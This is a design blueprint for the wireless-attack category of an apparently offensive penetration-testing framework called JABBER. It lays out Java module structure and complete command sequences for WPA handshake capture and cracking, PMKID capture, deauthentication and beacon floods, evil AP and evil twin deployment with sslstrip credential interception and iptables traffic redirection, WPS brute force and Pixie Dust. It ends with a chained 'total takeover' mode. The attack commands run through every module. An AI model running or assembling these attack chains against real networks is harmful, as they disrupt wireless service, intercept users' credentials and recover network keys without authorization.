# Wireless Hacking — Category Blueprint

**Category:** `WIRELESS_HACKING` | **Slug:** `wireless` | **Tools Dir:** `~/jabber/jabber-tools/wireless/`
**Package:** `com.jabber.jabber.modules.wireless` | **Group:** Access & Penetration

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Wireless Hacking** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between attack vectors (e.g., `SCAN` vs `ATTACK`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading PCAP files, captured handshakes, and cracked PMKIDs.
4. **Live Network Map**: Real-time visual display of BSSIDs, clients, and signal strengths (dBm) within range.
5. **Hardware Status Panel**: Continuous monitoring of wireless interface modes (Managed/Monitor) and channel locks.

---

---

## Modules

### 1. WPA Cracker
**ID:** `wireless-wpa-crack` | **Risk:** HIGH | **File:** `WPACrackerModule.java`
**Tools:** `airodump-ng`, `aireplay-ng`, `airmon-ng`, `aircrack-ng`, `hashcat`, `hcxpcapngtool`, `iwconfig`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Environmental wireless survey and handshake monitoring.
    - **Input Schema**: `{ interface: String, channel: int, bssid: String }`
    - **Multi-Tool Command Logic**:
        1. `airmon-ng start <interface>` (Monitor Mode Enable)
        2. `iwconfig <interface>` (Status Audit)
        3. `airodump-ng -c <channel> --bssid <bssid> -w survey_out <interface>` (Traffic Monitor)
        4. `aireplay-ng -0 5 -a <bssid> <interface>` (Client Trigger)
        5. `hcxpcapngtool -o verify.hc22000 survey_out-01.cap` (Handshake Verification)
    - **Execution Flow**: Monitor Enable -> Status Audit -> Traffic Monitor -> Client Trigger -> Verification.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SURVEY_[Timestamp]_handshake.cap`: Captured WPA/WPA2 4-way handshake.
        - `reports/outputs/SURVEY_[Timestamp]_verification.hc22000`: Handshake converted to hashcat-compatible format.
        - `reports/analysis/SURVEY_[Timestamp]_wireless_env.json`: Technical survey of local BSSIDs and channels.

- **`CRCK`** (Short Name: `CRCK`)
    - **Purpose**: High-speed recovery of WPA/WPA2 pre-shared keys.
    - **Input Schema**: `{ capture_file: Path, wordlist: Path, bssid: String }`
    - **Multi-Tool Command Logic**:
        1. `aircrack-ng -w <wordlist> -b <bssid> <capture_file>` (CPU-based Crack)
        2. `hcxpcapngtool -o crack.hc22000 <capture_file>` (Format Conversion)
        3. `hashcat -m 22000 crack.hc22000 <wordlist>` (GPU/Optimized Crack)
        4. `iwconfig` (Hardware Status)
        5. `airodump-ng --bssid <bssid> <capture_file>` (Asset Re-verification)
    - **Execution Flow**: CPU Crack -> Conversion -> GPU Crack -> Status -> Re-verification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/CRACK_[Timestamp]_aircrack_results.txt`: Log of CPU-based password recovery.
        - `reports/artifacts/CRACK_[Timestamp]_hashcat.pot`: Identified password stored in hashcat potfile format.
        - `reports/analysis/CRACK_[Timestamp]_hardware_status.json`: Audit of wireless hardware and driver stability.

---

### 2. PMKID Attack
**ID:** `wireless-pmkid` | **Risk:** HIGH | **File:** `PMKIDAttackModule.java`
**Tools:** `hcxdumptool`, `hcxpcapngtool`, `hashcat`, `airmon-ng`, `iwconfig`, `airodump-ng`

#### Execution Modes:

- **`CAPT`** (Short Name: `CAPT`)
    - **Purpose**: Client-less PMKID capture and wireless asset mapping.
    - **Input Schema**: `{ interface: String, duration_sec: int }`
    - **Multi-Tool Command Logic**:
        1. `airmon-ng check kill` (Process Cleanup)
        2. `iwconfig <interface> mode monitor` (Interface Config)
        3. `hcxdumptool -i <interface> -o pmkid.pcapng --enable_status=1` (Core Capture)
        4. `airodump-ng <interface> --write survey` (Secondary Audit)
        5. `hcxpcapngtool -o audit.hc22000 pmkid.pcapng` (Real-time Extraction)
    - **Execution Flow**: Cleanup -> Interface Config -> Core Capture -> Secondary Audit -> Extraction.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/CAPTURE_[Timestamp]_pmkid.pcapng`: Raw packet capture containing PMKID.
        - `reports/outputs/CAPTURE_[Timestamp]_pmkid_hash.hc22000`: Extracted PMKID hash for offline cracking.
        - `reports/analysis/CAPTURE_[Timestamp]_wireless_audit.json`: Detailed survey of APs vulnerable to PMKID attack.

- **`RECV`** (Short Name: `RECV`)
    - **Purpose**: Offline recovery of WPA keys from PMKID captures.
    - **Input Schema**: `{ hash_file: Path, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `hashcat -m 22000 <hash_file> <wordlist>` (Primary Recovery)
        2. `hcxpcapngtool -o verify.txt <hash_file>` (Hash Validation)
        3. `airmon-ng` (Interface Audit)
        4. `iwconfig` (Power Profile Check)
        5. `airodump-ng --help` (Version Consistency)
    - **Execution Flow**: Primary Recovery -> Validation -> Interface Audit -> Power Check -> Consistency.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RECOVER_[Timestamp]_hashcat_pmkid.txt`: Recovered passphrase from PMKID hash.
        - `reports/artifacts/RECOVER_[Timestamp]_validation.log`: Technical log of hash validation and integrity check.
        - `reports/analysis/RECOVER_[Timestamp]_power_profile.json`: Audit of hardware power and performance during recovery.

---

### 3. Deauth Attack
**ID:** `wireless-deauth` | **Risk:** HIGH | **File:** `DeauthAttackModule.java`
**Tools:** `aireplay-ng`, `mdk4`, `airodump-ng`, `airmon-ng`, `iwconfig`

#### Execution Modes:

- **`TRGT`** (Short Name: `TRGT`)
    - **Purpose**: Precision deauthentication of specific wireless clients.
    - **Input Schema**: `{ interface: String, bssid: String, client: String, count: int }`
    - **Multi-Tool Command Logic**:
        1. `airmon-ng start <interface>` (Monitor Mode)
        2. `airodump-ng -c <channel> --bssid <bssid> <interface>` (Asset Tracking)
        3. `aireplay-ng -0 <count> -a <bssid> -c <client> <interface>` (Precision Attack)
        4. `mdk4 <interface> d -B <bssid>` (Alternative Method)
        5. `iwconfig <interface>` (Signal Strength Audit)
    - **Execution Flow**: Monitor Mode -> Tracking -> Precision Attack -> Alternative -> Signal Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/TARGET_[Timestamp]_aireplay_deauth.log`: Execution log of targeted deauthentication attack.
        - `reports/outputs/TARGET_[Timestamp]_client_migration.json`: Tracking data for client disconnection and migration.
        - `reports/analysis/TARGET_[Timestamp]_signal_audit.json`: Audit of target signal strength and attack effectiveness.

- **`FLOD`** (Short Name: `FLOD`)
    - **Purpose**: Broad-spectrum deauthentication for denial-of-service testing.
    - **Input Schema**: `{ interface: String, bssid_list: Path }`
    - **Multi-Tool Command Logic**:
        1. `mdk4 <interface> d -B <bssid_list>` (Flood Attack)
        2. `aireplay-ng -0 0 -a <bssid> <interface>` (Continuous Attack)
        3. `airodump-ng <interface>` (Chaos Monitoring)
        4. `airmon-ng` (Driver Stability Check)
        5. `iwconfig` (TX Power Audit)
    - **Execution Flow**: Flood Attack -> Continuous Attack -> Chaos Monitoring -> Stability -> Power Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/FLOOD_[Timestamp]_mdk4_flood.log`: Telemetry from broad-spectrum deauthentication flood.
        - `reports/outputs/FLOOD_[Timestamp]_environment_impact.json`: Assessment of wireless environment disruption.
        - `reports/analysis/FLOOD_[Timestamp]_driver_stability.json`: Audit of wireless driver health under high-stress injection.

---

### 4. Evil AP
**ID:** `wireless-evil-ap` | **Risk:** CRITICAL | **File:** `EvilAPModule.java`
**Tools:** `hostapd`, `dnsmasq`, `iptables`, `airodump-ng`, `sslstrip`, `airmon-ng`

#### Execution Modes:

- **`DPLY`** (Short Name: `DPLY`)
    - **Purpose**: Full infrastructure deployment of an evil access point.
    - **Input Schema**: `{ interface: String, ssid: String, channel: int, gateway_ip: String }`
    - **Multi-Tool Command Logic**:
        1. `hostapd hostapd.conf &` (AP Deployment)
        2. `dnsmasq -C dnsmasq.conf &` (DHCP/DNS Config)
        3. `iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE` (NAT Setup)
        4. `airodump-ng <interface>` (Client Monitoring)
        5. `airmon-ng check` (Conflict Audit)
    - **Execution Flow**: AP Deployment -> DHCP/DNS -> NAT Setup -> Monitoring -> Conflict Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/DEPLOY_[Timestamp]_hostapd.log`: Core access point deployment and connection logs.
        - `reports/artifacts/DEPLOY_[Timestamp]_dnsmasq.log`: DHCP lease and DNS query logs from connected clients.
        - `reports/analysis/DEPLOY_[Timestamp]_client_inventory.json`: Detailed inventory of clients associated with the evil AP.

- **`STRP`** (Short Name: `STRP`)
    - **Purpose**: Active credential interception and SSL stripping on evil AP.
    - **Input Schema**: `{ listen_port: int, internal_iface: String }`
    - **Multi-Tool Command Logic**:
        1. `sslstrip -l <listen_port>` (Traffic Interception)
        2. `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listen_port>` (Traffic Redirect)
        3. `dnsmasq -C dnsmasq.conf` (DNS Spoofing)
        4. `airodump-ng <internal_iface>` (Signal Audit)
        5. `hostapd -v` (Status Verification)
    - **Execution Flow**: Interception -> Redirect -> Spoofing -> Signal Audit -> Verification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/STRIP_[Timestamp]_credentials.txt`: Intercepted credentials and sensitive data from SSL stripping.
        - `reports/artifacts/STRIP_[Timestamp]_sslstrip.log`: Detailed log of HTTPS to HTTP downgrades.
        - `reports/analysis/STRIP_[Timestamp]_traffic_audit.json`: Statistical audit of intercepted web traffic.

---

### 5. Evil Twin Deploy
**ID:** `wireless-eviltwin` | **Risk:** CRITICAL | **File:** `EvilTwinDeployModule.java`
**Tools:** `hostapd`, `dnsmasq`, `aireplay-ng`, `airmon-ng`, `iptables`, `airodump-ng`

#### Execution Modes:

- **`CLON`** (Short Name: `CLON`)
    - **Purpose**: Clone a target access point to intercept client traffic.
    - **Input Schema**: `{ interface: String, target_bssid: String, ssid: String }`
    - **Multi-Tool Command Logic**:
        1. `hostapd eviltwin.conf &` (Clone Deployment)
        2. `dnsmasq -C dnsmasq.conf` (DNS/DHCP Setup)
        3. `iptables -t nat -A POSTROUTING -j MASQUERADE` (Traffic Routing)
        4. `airodump-ng --bssid <target_bssid> <interface>` (Asset Tracking)
        5. `airmon-ng start <interface>` (Hardware Init)
    - **Execution Flow**: Clone Deployment -> DNS/DHCP -> Routing -> Tracking -> Hardware Init.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/CLONE_[Timestamp]_clone_deploy.log`: Deployment logs for the cloned access point.
        - `reports/outputs/CLONE_[Timestamp]_dns_spoof.log`: Log of spoofed DNS responses sent to clients.
        - `reports/analysis/CLONE_[Timestamp]_target_tracking.json`: Continuous tracking of the original AP vs the clone.

- **`ISOL`** (Short Name: `ISOL`)
    - **Purpose**: Force clients off the original AP to migrate them to the evil twin.
    - **Input Schema**: `{ interface: String, target_bssid: String }`
    - **Multi-Tool Command Logic**:
        1. `aireplay-ng -0 0 -a <target_bssid> <interface>` (Continuous Deauth)
        2. `mdk4 <interface> d -B <target_bssid>` (Alternative Disruption)
        3. `airodump-ng -c <channel> --bssid <target_bssid> <interface>` (Migration Monitoring)
        4. `airmon-ng check kill` (Process Cleanup)
        5. `iwconfig <interface> txpower 30` (Signal Boosting)
    - **Execution Flow**: Deauth -> Disruption -> Migration Monitor -> Cleanup -> Signal Boost.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/ISOLATE_[Timestamp]_deauth_migration.log`: Technical log of forced client migration.
        - `reports/outputs/ISOLATE_[Timestamp]_migration_success.json`: Statistical report on client association shifts.
        - `reports/analysis/ISOLATE_[Timestamp]_power_boost.json`: Audit of signal amplification and TX power changes.

---

### 6. Beacon Flood
**ID:** `wireless-beacon-flood` | **Risk:** MEDIUM | **File:** `BeaconFloodModule.java`
**Tools:** `mdk4`, `airmon-ng`, `iwconfig`, `airodump-ng`, `aireplay-ng`

#### Execution Modes:

- **`NOIS`** (Short Name: `NOIS`)
    - **Purpose**: Clutter the wireless environment with thousands of fake SSID beacons.
    - **Input Schema**: `{ interface: String, ssid_list: Path }`
    - **Multi-Tool Command Logic**:
        1. `mdk4 <interface> b -f <ssid_list>` (Flood Action)
        2. `airodump-ng <interface>` (Chaos Audit)
        3. `airmon-ng start <interface>` (Monitor Mode)
        4. `iwconfig <interface>` (Status Probe)
        5. `aireplay-ng --help` (Version Check)
    - **Execution Flow**: Flood Action -> Chaos Audit -> Monitor Mode -> Status Probe -> Version Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/NOISE_[Timestamp]_beacon_flood.log`: Telemetry from thousands of fake SSID injections.
        - `reports/outputs/NOISE_[Timestamp]_chaos_report.json`: Impact analysis of fake SSID clutter on local clients.
        - `reports/analysis/NOISE_[Timestamp]_hardware_probe.json`: Status of wireless hardware under max beacon load.

- **`TRGT`** (Short Name: `TRGT`)
    - **Purpose**: Targeted beacon flooding for a specific SSID to disrupt client roaming.
    - **Input Schema**: `{ interface: String, ssid: String }`
    - **Multi-Tool Command Logic**:
        1. `mdk4 <interface> b -n <ssid>` (Targeted Flood)
        2. `airodump-ng <interface> --essid <ssid>` (Asset Monitoring)
        3. `airmon-ng start <interface>` (Interface Init)
        4. `iwconfig <interface> channel 6` (Channel Locking)
        5. `aireplay-ng -0 1 -a <fake_bssid> <interface>` (Injection Test)
    - **Execution Flow**: Targeted Flood -> Monitoring -> Interface Init -> Channel Locking -> Injection Test.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/TARGET_[Timestamp]_ssid_flood.log`: Injection log for the specific target SSID.
        - `reports/outputs/TARGET_[Timestamp]_roaming_disruption.json`: Assessment of client roaming behavior under attack.
        - `reports/analysis/TARGET_[Timestamp]_injection_verification.json`: Technical verification of frame injection success.

---

### 7. WPS Pin
**ID:** `wireless-wps-pin` | **Risk:** HIGH | **File:** `WPSPinModule.java`
**Tools:** `reaver`, `bully`, `wash`, `airmon-ng`, `iwconfig`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify WPS-enabled access points and their security status.
    - **Input Schema**: `{ interface: String }`
    - **Multi-Tool Command Logic**:
        1. `wash -i <interface>` (Core WPS Scan)
        2. `airodump-ng <interface> --wps` (Asset Discovery)
        3. `airmon-ng start <interface>` (Hardware Init)
        4. `iwconfig <interface>` (Mode Verification)
        5. `reaver --help` (Dependency Check)
    - **Execution Flow**: WPS Scan -> Asset Discovery -> Hardware Init -> Verification -> Dependency Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_wash_results.json`: Detailed map of local WPS-enabled access points.
        - `reports/artifacts/SCAN_[Timestamp]_wps_discovery.xml`: Technical discovery report in XML format.
        - `reports/analysis/SCAN_[Timestamp]_wps_security.json`: Audit of WPS locking and security status.

- **`ATCK`** (Short Name: `ATCK`)
    - **Purpose**: Brute-force WPS PINs to recover WPA/WPA2 passphrases.
    - **Input Schema**: `{ interface: String, bssid: String, delay: int }`
    - **Multi-Tool Command Logic**:
        1. `reaver -i <interface> -b <bssid> -d <delay> -vv` (Primary Attack)
        2. `bully -b <bssid> -c <channel> <interface>` (Secondary Attack)
        3. `wash -i <interface> -b <bssid>` (Status Monitoring)
        4. `airmon-ng check kill` (Environmental Cleanup)
        5. `iwconfig <interface> power off` (Power Optimization)
    - **Execution Flow**: Primary Attack -> Secondary Attack -> Status Monitoring -> Cleanup -> Power Optimization.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ATTACK_[Timestamp]_reaver_wpa_key.txt`: Successfully recovered WPA key via WPS brute force.
        - `reports/artifacts/ATTACK_[Timestamp]_brute_force_log.txt`: Step-by-step log of PIN attempts and responses.
        - `reports/analysis/ATTACK_[Timestamp]_ap_lock_audit.json`: Audit of AP locking behavior and delay effectiveness.

---

### 8. Pixie Dust
**ID:** `wireless-pixiedust` | **Risk:** HIGH | **File:** `PixieDustModule.java`
**Tools:** `reaver`, `bully`, `pixiewps`, `airmon-ng`, `iwconfig`

#### Execution Modes:

- **`PIXI`** (Short Name: `PIXI`)
    - **Purpose**: Perform the Pixie Dust offline WPS attack for rapid key recovery.
    - **Input Schema**: `{ interface: String, bssid: String }`
    - **Multi-Tool Command Logic**:
        1. `reaver -i <interface> -b <bssid> -K 1 -vv` (Core Pixie Attack)
        2. `bully -b <bssid> -p "" -S <interface>` (Alternative Probe)
        3. `wash -i <interface> -b <bssid>` (Asset Validation)
        4. `airmon-ng` (Driver Audit)
        5. `iwconfig <interface>` (Signal Check)
    - **Execution Flow**: Core Pixie Attack -> Alternative Probe -> Asset Validation -> Driver Audit -> Signal Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/PIXIE_[Timestamp]_pixie_key.txt`: Rapidly recovered WPA key via Pixie Dust attack.
        - `reports/artifacts/PIXIE_[Timestamp]_pixie_dust_log.txt`: Cryptographic exchange log for Pixie Dust.
        - `reports/analysis/PIXIE_[Timestamp]_asset_validation.json`: Verification of the target's vulnerability to Pixie Dust.

- **`OFFL`** (Short Name: `OFFL`)
    - **Purpose**: Cryptographic calculation of WPS PIN from captured data.
    - **Input Schema**: `{ pke: String, pkr: String, e_hash1: String, e_hash2: String, authkey: String, e_nonce: String }`
    - **Multi-Tool Command Logic**:
        1. `pixiewps -e <pke> -r <pkr> -s <e_hash1> -z <e_hash2> -a <authkey> -n <e_nonce>` (Core Calculation)
        2. `reaver --help` (Binary Check)
        3. `bully --version` (Binary Check)
        4. `airmon-ng` (System Context)
        5. `iwconfig` (System Context)
    - **Execution Flow**: Core Calculation -> Binary Check -> Binary Check -> System Context -> System Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/OFFLINE_[Timestamp]_calculated_pin.txt`: Successfully calculated WPS PIN from captured data.
        - `reports/artifacts/OFFLINE_[Timestamp]_pixiewps_telemetry.txt`: Detailed cryptographic calculation telemetry.
        - `reports/analysis/OFFLINE_[Timestamp]_system_context.json`: Audit of system resources used for calculation.

---

### 9. Wireless Attack Suite
**ID:** `wireless-suite` | **Risk:** CRITICAL | **File:** `WirelessAttackSuiteModule.java`
**Tools:** `aircrack-ng`, `hashcat`, `hcxdumptool`, `hostapd`, `mdk4`, `airmon-ng`, `airodump-ng`

#### Execution Modes:

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Full-spectrum wireless security audit and vulnerability assessment.
    - **Input Schema**: `{ interface: String, target_bssid: String }`
    - **Multi-Tool Command Logic**:
        1. `airodump-ng --bssid <target_bssid> <interface>` (Asset Audit)
        2. `hcxdumptool -i <interface> --enable_status=1` (Packet Audit)
        3. `mdk4 <interface> d -B <target_bssid>` (Stress Test)
        4. `airmon-ng check` (Driver Audit)
        5. `iwconfig <interface>` (Hardware Audit)
    - **Execution Flow**: Asset Audit -> Packet Audit -> Stress Test -> Driver Audit -> Hardware Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_full_wireless_report.json`: Comprehensive wireless vulnerability assessment.
        - `reports/artifacts/AUDIT_[Timestamp]_packet_telemetry.pcapng`: Multi-tool packet capture for forensic audit.
        - `reports/analysis/AUDIT_[Timestamp]_hardware_health.json`: Detailed health and performance report for wireless hardware.

- **`EXPL`** (Short Name: `EXPL`)
    - **Purpose**: Orchestrated execution of multiple wireless exploits for total takeover.
    - **Input Schema**: `{ interface: String, target_bssid: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `reaver -i <interface> -b <target_bssid> -K 1` (Pixie Exploitation)
        2. `aireplay-ng -0 10 -a <target_bssid> <interface>` (Handshake Exploitation)
        3. `hostapd eviltwin.conf &` (Evil Twin Exploitation)
        4. `hashcat -m 22000 handshake.hc22000 <wordlist>` (Offline Recovery)
        5. `airmon-ng start <interface>` (Environment Reset)
    - **Execution Flow**: Pixie Exploitation -> Handshake Exploitation -> Evil Twin -> Offline Recovery -> Reset.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXPLOIT_[Timestamp]_takeover_summary.json`: Summary of all successful exploits and acquired access.
        - `reports/artifacts/EXPLOIT_[Timestamp]_orchestration.log`: Orchestration log of multi-tool exploit chain.
        - `reports/payloads/EXPLOIT_[Timestamp]_final_keys.txt`: Final list of all recovered keys and credentials.

---

### 10. Deauth Sender
**ID:** `wireless-deauth-sender` | **Risk:** MEDIUM | **File:** `DeauthSenderModule.java`
**Tools:** `aireplay-ng`, `mdk4`, `airmon-ng`, `iwconfig`, `airodump-ng`

#### Execution Modes:

- **`SEND`** (Short Name: `SEND`)
    - **Purpose**: Continuous deauthentication frame injection for client disruption.
    - **Input Schema**: `{ interface: String, bssid: String, client: String }`
    - **Multi-Tool Command Logic**:
        1. `airmon-ng start <interface>` (Monitor Mode)
        2. `aireplay-ng -0 0 -a <bssid> -c <client> <interface>` (Core Deauth)
        3. `mdk4 <interface> d -B <bssid>` (Alternative Method)
        4. `airodump-ng --bssid <bssid> <interface>` (Impact Monitoring)
        5. `iwconfig <interface>` (Signal Strength)
    - **Execution Flow**: Monitor Mode -> Core Deauth -> Alternative -> Monitoring -> Signal.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SEND_[Timestamp]_deauth_telemetry.log`: Real-time telemetry from deauthentication injection.
        - `reports/outputs/SEND_[Timestamp]_impact_report.json`: Assessment of client disconnection and recovery attempts.
        - `reports/analysis/SEND_[Timestamp]_interface_status.json`: Hardware and driver status during high-rate injection.

- **`TEST`** (Short Name: `TEST`)
    - **Purpose**: Verify the susceptibility of clients to deauthentication attacks.
    - **Input Schema**: `{ interface: String, bssid: String, client: String }`
    - **Multi-Tool Command Logic**:
        1. `aireplay-ng -0 1 -a <bssid> -c <client> <interface>` (Single Probe)
        2. `airodump-ng --bssid <bssid> <interface>` (Response Monitor)
        3. `mdk4 <interface> d -B <bssid> -c <client>` (Secondary Probe)
        4. `airmon-ng start <interface>` (Status Audit)
        5. `iwconfig <interface>` (Hardware Audit)
    - **Execution Flow**: Single Probe -> Response Monitor -> Secondary Probe -> Status Audit -> Hardware Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/TEST_[Timestamp]_deauth_susceptibility.json`: Report on whether the client respects deauth frames.
        - `reports/analysis/TEST_[Timestamp]_test_hardware_status.json`: Hardware state after probe execution.

---

### 11. WPA Handshake
**ID:** `wireless-wpa-handshake` | **Risk:** MEDIUM | **File:** `WPAHandshakeModule.java`
**Tools:** `airodump-ng`, `aireplay-ng`, `hcxpcapngtool`, `airmon-ng`, `iwconfig`

#### Execution Modes:

- **`CAPT`** (Short Name: `CAPT`)
    - **Purpose**: Orchestrated capture of WPA/WPA2 4-way handshakes.
    - **Input Schema**: `{ interface: String, bssid: String, channel: int }`
    - **Multi-Tool Command Logic**:
        1. `airmon-ng start <interface> <channel>` (Channel Lock)
        2. `airodump-ng -c <channel> --bssid <bssid> -w capture <interface>` (Sniffing)
        3. `aireplay-ng -0 5 -a <bssid> <interface>` (Deauth Trigger)
        4. `hcxpcapngtool -o handshake.hc22000 capture-01.cap` (Verification)
        5. `iwconfig <interface>` (Hardware Audit)
    - **Execution Flow**: Channel Lock -> Sniffing -> Trigger -> Verification -> Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/CAPTURE_[Timestamp]_wpa_handshake.cap`: Raw packet capture containing the 4-way handshake.
        - `reports/outputs/CAPTURE_[Timestamp]_hash_export.hc22000`: Extracted handshake hash for offline cracking.
        - `reports/analysis/CAPTURE_[Timestamp]_capture_quality.json`: Audit of capture signal quality and completeness.

- **`VRFY`** (Short Name: `VRFY`)
    - **Purpose**: Offline validation and inspection of existing WPA handshake captures.
    - **Input Schema**: `{ capture_file: Path }`
    - **Multi-Tool Command Logic**:
        1. `hcxpcapngtool -o output.hc22000 <capture_file>` (Integrity Check)
        2. `aircrack-ng -J verify <capture_file>` (Format Validate)
        3. `airodump-ng <capture_file>` (Metadata Extract)
        4. `airmon-ng` (System Context)
        5. `iwconfig` (System Context)
    - **Execution Flow**: Integrity Check -> Format Validate -> Metadata Extract -> System Context x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VERIFY_[Timestamp]_handshake_status.json`: Technical validation report of the capture file.
        - `reports/analysis/VERIFY_[Timestamp]_capture_metadata.json`: Extracted metadata including BSSID and ESSID.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**
